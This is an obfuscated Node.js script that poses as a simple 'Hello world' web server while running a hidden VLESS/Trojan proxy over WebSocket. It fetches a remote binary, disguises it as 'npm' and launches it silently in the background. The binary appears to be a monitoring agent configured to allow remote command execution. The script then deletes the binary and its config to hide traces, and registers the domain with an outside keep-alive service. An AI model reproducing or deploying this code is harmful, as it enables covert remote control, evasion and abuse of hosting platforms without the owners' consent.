const _0xaf0213=_0x9e2f;(function(_0x10e3c7,_0x1e7259){const _0x47192f=_0x9e2f,_0x1226d2=_0x10e3c7();while(!![]){try{const _0x2ef856=parseInt(_0x47192f(0xdf))/0x1+-parseInt(_0x47192f(0x115))/0x2*(parseInt(_0x47192f(0xe0))/0x3)+-parseInt(_0x47192f(0x145))/0x4*(-parseInt(_0x47192f(0xda))/0x5)+-parseInt(_0x47192f(0xd1))/0x6*(-parseInt(_0x47192f(0xf4))/0x7)+parseInt(_0x47192f(0xde))/0x8*(-parseInt(_0x47192f(0xf3))/0x9)+-parseInt(_0x47192f(0xcd))/0xa+-parseInt(_0x47192f(0x124))/0xb*(parseInt(_0x47192f(0xd2))/0xc);if(_0x2ef856===_0x1e7259)break;else _0x1226d2['push'](_0x1226d2['shift']());}catch(_0x1ec7a9){_0x1226d2['push'](_0x1226d2['shift']());}}}(_0x291b,0x2aac8));function _0x291b(){const _0xc45cf8=['setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','npm\x20download\x20successfully','finish','url','concat','crypto','reduce',':443?security=tls&sni=','true','pop','npm\x20is\x20already\x20running,\x20skip\x20running...','NEZHA_PORT','map','writeHead','digest','Server','pipe','chmod\x20+x\x20npm','find','then','Hug','/bin/bash','arm','14370UAxPUI','get','net','npm\x20is\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','test','vless://','readUInt16BE','trim','https://speed.cloudflare.com/meta','https://dns.google/resolve?name=','2096','text/html','setsid\x20nohup\x20./npm\x20-s\x20','&type=A','193523vACloe','log','DOMAIN','listen','npm\x20running\x20error:','from','catch','application/json','SUB_PATH','NEZHA_SERVER','sha224','createServer','index.html','substr','includes','unlink','message','writeFileSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','close','Status','error','Automatic\x20Access\x20Task\x20added\x20successfully','suburl','replace','Failed\x20to\x20resolve\x20',':443?encryption=none&security=tls&sni=','length','&path=%2F','hex','readFile','send','https://oooo.serv00.net/add-url','8pIHgsf','base64','utf8','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','createWriteStream','8.8.4.4','NEZHA_KEY','AUTO_ACCESS','https://amd64.ssss.nyc.mn/agent','createHash','update','arm64','Server\x20is\x20running\x20on\x20port\x20','false','data','843320YPybcc','connection','child_process','http','54Ecaeqy','60KoMblv','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','once','\x20with\x20all\x20DNS\x20servers','\x20-p\x20','slice','error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','204430phJzYR','country','trojan://','toString','75336FNHejC','274758GPHVvX','6GDfwyX','env','--tls','arch','client_secret:\x20','join','25325c34-e27c-4da1-bdeb-fc4d89a4e608','connect','every','Hello\x20world!','split','path','aarch64','2087','8443','&fp=chrome&type=ws&host=','buffer','npm','application/dns-json','36twjRQz','33131YZpovp','end','post','Answer','text/plain','UUID','stream','1.1.1.1','write','WSPATH'];_0x291b=function(){return _0xc45cf8;};return _0x291b();}const os=require('os'),http=require(_0xaf0213(0xd0)),fs=require('fs'),axios=require('axios'),net=require(_0xaf0213(0x117)),path=require(_0xaf0213(0xeb)),crypto=require(_0xaf0213(0x103)),{Buffer}=require(_0xaf0213(0xf0)),{exec,execSync}=require(_0xaf0213(0xcf)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xaf0213(0xe1)][_0xaf0213(0xf9)]||_0xaf0213(0xe6),NEZHA_SERVER=process[_0xaf0213(0xe1)][_0xaf0213(0x12d)]||'',NEZHA_PORT=process[_0xaf0213(0xe1)][_0xaf0213(0x109)]||'',NEZHA_KEY=process[_0xaf0213(0xe1)][_0xaf0213(0x14b)]||'',DOMAIN=process[_0xaf0213(0xe1)][_0xaf0213(0x126)]||'1234.abc.com',AUTO_ACCESS=process[_0xaf0213(0xe1)][_0xaf0213(0x14c)]||!![],WSPATH=process[_0xaf0213(0xe1)][_0xaf0213(0xfd)]||UUID[_0xaf0213(0xd7)](0x0,0x8),SUB_PATH=process['env'][_0xaf0213(0x12c)]||_0xaf0213(0x13b),NAME=process[_0xaf0213(0xe1)]['NAME']||_0xaf0213(0x112),PORT=process[_0xaf0213(0xe1)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x504c81=_0xaf0213;try{const _0x581813=await axios[_0x504c81(0x116)](_0x504c81(0x11e)),_0x38edce=_0x581813[_0x504c81(0xcc)];ISP=(_0x38edce[_0x504c81(0xdb)]+'-'+_0x38edce['asOrganization'])['replace'](/ /g,'_');}catch(_0x4420ae){ISP='Unknown';}};GetISP();const httpServer=http[_0xaf0213(0x12f)]((_0x3b591b,_0x294541)=>{const _0x5705a0=_0xaf0213;if(_0x3b591b[_0x5705a0(0x101)]==='/'){const _0xb07607=path[_0x5705a0(0xe5)](__dirname,_0x5705a0(0x130));fs[_0x5705a0(0x142)](_0xb07607,_0x5705a0(0x147),(_0x5b64fd,_0x1f1118)=>{const _0x5dbc72=_0x5705a0;if(_0x5b64fd){_0x294541[_0x5dbc72(0x10b)](0xc8,{'Content-Type':_0x5dbc72(0x121)}),_0x294541[_0x5dbc72(0xf5)](_0x5dbc72(0xe9));return;}_0x294541['writeHead'](0xc8,{'Content-Type':_0x5dbc72(0x121)}),_0x294541[_0x5dbc72(0xf5)](_0x1f1118);});return;}else{if(_0x3b591b[_0x5705a0(0x101)]==='/'+SUB_PATH){const _0x534978=_0x5705a0(0x11b)+UUID+'@'+DOMAIN+_0x5705a0(0x13e)+DOMAIN+_0x5705a0(0xef)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x514cb4=_0x5705a0(0xdc)+UUID+'@'+DOMAIN+_0x5705a0(0x105)+DOMAIN+_0x5705a0(0xef)+DOMAIN+_0x5705a0(0x140)+WSPATH+'#'+NAME+'-'+ISP,_0x22df7f=_0x534978+'\x0a'+_0x514cb4,_0x29e139=Buffer[_0x5705a0(0x129)](_0x22df7f)[_0x5705a0(0xdd)](_0x5705a0(0x146));_0x294541['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x294541[_0x5705a0(0xf5)](_0x29e139+'\x0a');}else _0x294541[_0x5705a0(0x10b)](0x194,{'Content-Type':_0x5705a0(0xf8)}),_0x294541[_0x5705a0(0xf5)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0xaf0213(0x10d))]({'server':httpServer}),uuid=UUID[_0xaf0213(0x13c)](/-/g,''),DNS_SERVERS=[_0xaf0213(0x14a),_0xaf0213(0xfb)];function _0x9e2f(_0xcb2569,_0x4573b0){const _0x291ba2=_0x291b();return _0x9e2f=function(_0x9e2fbf,_0x5cdf0e){_0x9e2fbf=_0x9e2fbf-0xcb;let _0xfc1e28=_0x291ba2[_0x9e2fbf];return _0xfc1e28;},_0x9e2f(_0xcb2569,_0x4573b0);}function resolveHost(_0xe49ee7){return new Promise((_0x40055c,_0x214225)=>{const _0x4ab741=_0x9e2f;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4ab741(0x11a)](_0xe49ee7)){_0x40055c(_0xe49ee7);return;}let _0x37d0bf=0x0;function _0x5e6d79(){const _0x1f3ab1=_0x4ab741;if(_0x37d0bf>=DNS_SERVERS['length']){_0x214225(new Error(_0x1f3ab1(0x13d)+_0xe49ee7+_0x1f3ab1(0xd5)));return;}const _0x312d67=DNS_SERVERS[_0x37d0bf];_0x37d0bf++;const _0x13af0b=_0x1f3ab1(0x11f)+encodeURIComponent(_0xe49ee7)+_0x1f3ab1(0x123);axios[_0x1f3ab1(0x116)](_0x13af0b,{'timeout':0x1388,'headers':{'Accept':_0x1f3ab1(0xf2)}})[_0x1f3ab1(0x111)](_0x396477=>{const _0x15f5f9=_0x1f3ab1,_0x241f5b=_0x396477[_0x15f5f9(0xcc)];if(_0x241f5b[_0x15f5f9(0x138)]===0x0&&_0x241f5b[_0x15f5f9(0xf7)]&&_0x241f5b['Answer'][_0x15f5f9(0x13f)]>0x0){const _0x2710b6=_0x241f5b[_0x15f5f9(0xf7)][_0x15f5f9(0x110)](_0x25b350=>_0x25b350['type']===0x1);if(_0x2710b6){_0x40055c(_0x2710b6[_0x15f5f9(0xcc)]);return;}}_0x5e6d79();})[_0x1f3ab1(0x12a)](_0x232798=>{_0x5e6d79();});}_0x5e6d79();});}function handleVlessConnection(_0x1578f8,_0x35551c){const _0x3a08e6=_0xaf0213,[_0x2bf8f7]=_0x35551c,_0x5a8b5c=_0x35551c[_0x3a08e6(0xd7)](0x1,0x11);if(!_0x5a8b5c[_0x3a08e6(0xe8)]((_0x3dc695,_0x4a5d7a)=>_0x3dc695==parseInt(uuid[_0x3a08e6(0x131)](_0x4a5d7a*0x2,0x2),0x10)))return![];let _0x397877=_0x35551c[_0x3a08e6(0xd7)](0x11,0x12)['readUInt8']()+0x13;const _0x302922=_0x35551c[_0x3a08e6(0xd7)](_0x397877,_0x397877+=0x2)[_0x3a08e6(0x11c)](0x0),_0x2872a6=_0x35551c[_0x3a08e6(0xd7)](_0x397877,_0x397877+=0x1)['readUInt8'](),_0x5e19b8=_0x2872a6==0x1?_0x35551c['slice'](_0x397877,_0x397877+=0x4)['join']('.'):_0x2872a6==0x2?new TextDecoder()['decode'](_0x35551c[_0x3a08e6(0xd7)](_0x397877+0x1,_0x397877+=0x1+_0x35551c[_0x3a08e6(0xd7)](_0x397877,_0x397877+0x1)['readUInt8']())):_0x2872a6==0x3?_0x35551c[_0x3a08e6(0xd7)](_0x397877,_0x397877+=0x10)[_0x3a08e6(0x104)]((_0x25bad4,_0x26cc9a,_0x5c869e,_0x42d53b)=>_0x5c869e%0x2?_0x25bad4[_0x3a08e6(0x102)](_0x42d53b[_0x3a08e6(0xd7)](_0x5c869e-0x1,_0x5c869e+0x1)):_0x25bad4,[])[_0x3a08e6(0x10a)](_0x1435be=>_0x1435be[_0x3a08e6(0x11c)](0x0)[_0x3a08e6(0xdd)](0x10))['join'](':'):'';_0x1578f8[_0x3a08e6(0x143)](new Uint8Array([_0x2bf8f7,0x0]));const _0x1eda2f=createWebSocketStream(_0x1578f8);return resolveHost(_0x5e19b8)['then'](_0x3af684=>{const _0x3e77d0=_0x3a08e6;net[_0x3e77d0(0xe7)]({'host':_0x3af684,'port':_0x302922},function(){const _0x59d23a=_0x3e77d0;this[_0x59d23a(0xfc)](_0x35551c[_0x59d23a(0xd7)](_0x397877)),_0x1eda2f['on'](_0x59d23a(0x139),()=>{})[_0x59d23a(0x10e)](this)['on'](_0x59d23a(0x139),()=>{})['pipe'](_0x1eda2f);})['on'](_0x3e77d0(0x139),()=>{});})[_0x3a08e6(0x12a)](_0x534825=>{const _0x57c02b=_0x3a08e6;net[_0x57c02b(0xe7)]({'host':_0x5e19b8,'port':_0x302922},function(){const _0xfb190=_0x57c02b;this[_0xfb190(0xfc)](_0x35551c['slice'](_0x397877)),_0x1eda2f['on'](_0xfb190(0x139),()=>{})[_0xfb190(0x10e)](this)['on'](_0xfb190(0x139),()=>{})[_0xfb190(0x10e)](_0x1eda2f);})['on'](_0x57c02b(0x139),()=>{});}),!![];}function handleTrojanConnection(_0x338973,_0x53c44e){const _0x4aa0e5=_0xaf0213;try{if(_0x53c44e[_0x4aa0e5(0x13f)]<0x3a)return![];const _0x1ca9df=_0x53c44e[_0x4aa0e5(0xd7)](0x0,0x38)[_0x4aa0e5(0xdd)](),_0x15d90a=[UUID];let _0x137815=null;for(const _0x4f3a17 of _0x15d90a){const _0x3cd6ee=crypto[_0x4aa0e5(0x14e)](_0x4aa0e5(0x12e))[_0x4aa0e5(0x14f)](_0x4f3a17)[_0x4aa0e5(0x10c)](_0x4aa0e5(0x141));if(_0x3cd6ee===_0x1ca9df){_0x137815=_0x4f3a17;break;}}if(!_0x137815)return![];let _0x17e033=0x38;_0x53c44e[_0x17e033]===0xd&&_0x53c44e[_0x17e033+0x1]===0xa&&(_0x17e033+=0x2);const _0x5489e9=_0x53c44e[_0x17e033];if(_0x5489e9!==0x1)return![];_0x17e033+=0x1;const _0x1d1f08=_0x53c44e[_0x17e033];_0x17e033+=0x1;let _0x15f14d,_0x33805e;if(_0x1d1f08===0x1)_0x15f14d=_0x53c44e['slice'](_0x17e033,_0x17e033+0x4)[_0x4aa0e5(0xe5)]('.'),_0x17e033+=0x4;else{if(_0x1d1f08===0x3){const _0x3414ba=_0x53c44e[_0x17e033];_0x17e033+=0x1,_0x15f14d=_0x53c44e[_0x4aa0e5(0xd7)](_0x17e033,_0x17e033+_0x3414ba)['toString'](),_0x17e033+=_0x3414ba;}else{if(_0x1d1f08===0x4)_0x15f14d=_0x53c44e[_0x4aa0e5(0xd7)](_0x17e033,_0x17e033+0x10)[_0x4aa0e5(0x104)]((_0x19a4ab,_0x127de2,_0x100e1e,_0x4620ee)=>_0x100e1e%0x2?_0x19a4ab[_0x4aa0e5(0x102)](_0x4620ee['slice'](_0x100e1e-0x1,_0x100e1e+0x1)):_0x19a4ab,[])[_0x4aa0e5(0x10a)](_0x3a3325=>_0x3a3325['readUInt16BE'](0x0)[_0x4aa0e5(0xdd)](0x10))[_0x4aa0e5(0xe5)](':'),_0x17e033+=0x10;else return![];}}_0x33805e=_0x53c44e[_0x4aa0e5(0x11c)](_0x17e033),_0x17e033+=0x2;_0x17e033<_0x53c44e['length']&&_0x53c44e[_0x17e033]===0xd&&_0x53c44e[_0x17e033+0x1]===0xa&&(_0x17e033+=0x2);const _0x5ac5a3=createWebSocketStream(_0x338973);return resolveHost(_0x15f14d)[_0x4aa0e5(0x111)](_0x279bad=>{const _0x4c571f=_0x4aa0e5;net[_0x4c571f(0xe7)]({'host':_0x279bad,'port':_0x33805e},function(){const _0x2886c9=_0x4c571f;_0x17e033<_0x53c44e['length']&&this['write'](_0x53c44e[_0x2886c9(0xd7)](_0x17e033)),_0x5ac5a3['on'](_0x2886c9(0x139),()=>{})[_0x2886c9(0x10e)](this)['on'](_0x2886c9(0x139),()=>{})[_0x2886c9(0x10e)](_0x5ac5a3);})['on']('error',()=>{});})[_0x4aa0e5(0x12a)](_0x1f6d81=>{const _0x5b8956=_0x4aa0e5;net[_0x5b8956(0xe7)]({'host':_0x15f14d,'port':_0x33805e},function(){const _0x2e679d=_0x5b8956;_0x17e033<_0x53c44e[_0x2e679d(0x13f)]&&this['write'](_0x53c44e[_0x2e679d(0xd7)](_0x17e033)),_0x5ac5a3['on']('error',()=>{})[_0x2e679d(0x10e)](this)['on'](_0x2e679d(0x139),()=>{})[_0x2e679d(0x10e)](_0x5ac5a3);})['on'](_0x5b8956(0x139),()=>{});}),!![];}catch(_0xbc27ec){return![];}}wss['on'](_0xaf0213(0xce),(_0xcd44ac,_0x41c76f)=>{const _0x17f788=_0xaf0213,_0x47749c=_0x41c76f[_0x17f788(0x101)]||'';_0xcd44ac[_0x17f788(0xd4)](_0x17f788(0x134),_0x22338b=>{const _0x51adf3=_0x17f788;if(_0x22338b[_0x51adf3(0x13f)]>0x11&&_0x22338b[0x0]===0x0){const _0x594ea5=_0x22338b[_0x51adf3(0xd7)](0x1,0x11),_0xed6d7f=_0x594ea5['every']((_0x131943,_0x2d7f85)=>_0x131943==parseInt(uuid[_0x51adf3(0x131)](_0x2d7f85*0x2,0x2),0x10));if(_0xed6d7f){!handleVlessConnection(_0xcd44ac,_0x22338b)&&_0xcd44ac[_0x51adf3(0x137)]();return;}}!handleTrojanConnection(_0xcd44ac,_0x22338b)&&_0xcd44ac[_0x51adf3(0x137)]();})['on'](_0x17f788(0x139),()=>{});});const getDownloadUrl=()=>{const _0x33e1f7=_0xaf0213,_0x1500b6=os[_0x33e1f7(0xe3)]();return _0x1500b6===_0x33e1f7(0x114)||_0x1500b6===_0x33e1f7(0x150)||_0x1500b6===_0x33e1f7(0xec)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x33e1f7(0x14d);},downloadFile=async()=>{const _0x303ac4=_0xaf0213;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5b1a81=getDownloadUrl(),_0x501c28=await axios({'method':_0x303ac4(0x116),'url':_0x5b1a81,'responseType':_0x303ac4(0xfa)}),_0x16c53d=fs[_0x303ac4(0x149)]('npm');return _0x501c28['data'][_0x303ac4(0x10e)](_0x16c53d),new Promise((_0x571c8f,_0x33c93a)=>{const _0x5a5bb2=_0x303ac4;_0x16c53d['on'](_0x5a5bb2(0x100),()=>{const _0x4f574c=_0x5a5bb2;console[_0x4f574c(0x125)](_0x4f574c(0xff)),exec(_0x4f574c(0x10f),_0x21dc75=>{if(_0x21dc75)_0x33c93a(_0x21dc75);_0x571c8f();});}),_0x16c53d['on']('error',_0x33c93a);});}catch(_0x1e192f){throw _0x1e192f;}},runnz=async()=>{const _0x39a178=_0xaf0213;try{const _0x2eee98=execSync(_0x39a178(0xd3),{'encoding':'utf-8'});if(_0x2eee98[_0x39a178(0x11d)]()!==''){console[_0x39a178(0x125)](_0x39a178(0x108));return;}}catch(_0x265291){}await downloadFile();let _0x3c4aa7='',_0x1590fd=['443',_0x39a178(0xee),_0x39a178(0x120),_0x39a178(0xed),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x51bf11=_0x1590fd[_0x39a178(0x132)](NEZHA_PORT)?_0x39a178(0xe2):'';_0x3c4aa7=_0x39a178(0x122)+NEZHA_SERVER+':'+NEZHA_PORT+_0x39a178(0xd6)+NEZHA_KEY+'\x20'+_0x51bf11+_0x39a178(0x136);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6cef6c=NEZHA_SERVER[_0x39a178(0x132)](':')?NEZHA_SERVER[_0x39a178(0xea)](':')[_0x39a178(0x107)]():'',_0xbfd82e=_0x1590fd[_0x39a178(0x132)](_0x6cef6c)?_0x39a178(0x106):_0x39a178(0xcb),_0x15b2d4=_0x39a178(0xe4)+NEZHA_KEY+_0x39a178(0x148)+NEZHA_SERVER+_0x39a178(0x119)+_0xbfd82e+_0x39a178(0xd9)+UUID;fs[_0x39a178(0x135)]('config.yaml',_0x15b2d4);}_0x3c4aa7=_0x39a178(0xfe);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3c4aa7,{'shell':_0x39a178(0x113)},_0x4e2e73=>{const _0x8a6b36=_0x39a178;if(_0x4e2e73)console[_0x8a6b36(0x139)](_0x8a6b36(0x128),_0x4e2e73);else console[_0x8a6b36(0x125)](_0x8a6b36(0x118));});}catch(_0x53c61b){console[_0x39a178(0x139)](_0x39a178(0xd8)+_0x53c61b);}};async function addAccessTask(){const _0x28f5e=_0xaf0213;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x7c31e4='https://'+DOMAIN;try{const _0x177b6f=await axios[_0x28f5e(0xf6)](_0x28f5e(0x144),{'url':_0x7c31e4},{'headers':{'Content-Type':_0x28f5e(0x12b)}});console['log'](_0x28f5e(0x13a));}catch(_0x1e9e98){}}const delFiles=()=>{const _0xd9fc93=_0xaf0213;fs['unlink'](_0xd9fc93(0xf1),()=>{}),fs[_0xd9fc93(0x133)]('config.yaml',()=>{});};httpServer[_0xaf0213(0x127)](PORT,()=>{const _0x1b3248=_0xaf0213;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x1b3248(0x151)+PORT);});
